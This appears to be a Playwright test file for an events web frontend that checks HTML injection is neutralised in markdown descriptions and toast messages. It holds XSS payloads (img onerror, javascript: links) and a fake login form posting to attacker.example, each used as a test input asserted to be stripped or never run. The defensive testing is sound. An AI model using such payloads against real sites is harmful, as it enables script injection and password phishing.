import type { Page } from '@playwright/test';
import { test, expect, loginInBrowser, moveToModule } from '../support/api.ts';

// Each payload sets window.__injected when it gets to run.
const injected = (page: Page): Promise<unknown> => page.evaluate(() => (window as unknown as { __injected?: unknown }).__injected);

test.describe('HTML injection in the frontend', () => {
    test('markdown keeps formatting but drops scripts, styles and forms', moveToModule('frontend', 'once the frontend has component tests for the markdown filter'), async ({ api, page }) => {
        const description = [
            'Intro with **bold text** and a [normal link](https://www.aegee.org).',
            '',
            '<img src="x" onerror="window.__injected = \'img\'">',
            '',
            '<style>body { display: none !important; }</style>',
            '',
            '<form action="https://attacker.example/login"><input name="password" type="password"><button>Log in again</button></form>',
            '',
            '<p style="position: fixed; inset: 0; background: white;">Covering the page</p>',
            '',
            '[click me](javascript:window.__injected=\'link\')'
        ].join('\n');

        const event = await api.createEvent('admin', { type: 'training', description });
        await api.publishAsAdmin(event.id);

        await loginInBrowser(page, api, 'member');
        await page.goto(`/events/${event.url}`);

        const rendered = page.locator('.markdown').filter({ hasText: 'Intro with' });
        await expect(rendered).toBeVisible();

        // Markdown itself still works.
        await expect(rendered.locator('strong')).toHaveText('bold text');
        await expect(rendered.locator('a[href="https://www.aegee.org"]')).toHaveText('normal link');
        await expect(rendered.getByText('Covering the page')).toBeVisible();

        // Everything that could run code, restyle or cover the page, or fake a form is gone.
        await expect(rendered.locator('img[onerror]')).toHaveCount(0);
        await expect(rendered.locator('style')).toHaveCount(0);
        await expect(rendered.locator('form, input, button')).toHaveCount(0);
        await expect(rendered.locator('[style]')).toHaveCount(0);
        await expect(rendered.locator('a[href^="javascript:"]')).toHaveCount(0);
        await rendered.getByText('click me').click();
        expect(await injected(page)).toBeUndefined();
    });

    test('toasts show names and server messages as text', moveToModule('frontend', 'once the frontend has component tests for the toast helpers'), async ({ api, page }) => {
        await loginInBrowser(page, api, 'member');
        await page.goto('/');
        await expect(page.locator('#app')).toBeVisible();

        const payload = '<img src="x" onerror="window.__injected = true">';
        // Calls one of the toast helpers of the app's root instance (src/methods/index.js).
        const callRootHelper = (name: string, args: unknown[]) => page.evaluate(([helper, helperArgs]) => {
            const root = (document.querySelector('#app') as unknown as { __vue__: { $root: Record<string, (...a: unknown[]) => void> } }).__vue__.$root;
            root[helper as string](...(helperArgs as unknown[]));
        }, [name, args] as const);

        // A success toast with a user-provided name.
        await callRootHelper('showSuccess', [`Event "${payload}" is successfully added.`]);
        await expect(page.getByText(`Event "${payload}" is successfully added.`)).toBeVisible();

        // An error toast with the message from the API response. Buefy queues toasts, so it
        // can take up to the 3 seconds of the previous one to show up.
        await callRootHelper('showError', ['Could not save event', { response: { data: { message: payload } } }]);
        await expect(page.getByText(`Could not save event: ${payload}`)).toBeVisible({ timeout: 10 * 1000 });

        await expect(page.locator('.notices img')).toHaveCount(0);
        expect(await injected(page)).toBeUndefined();
    });
});
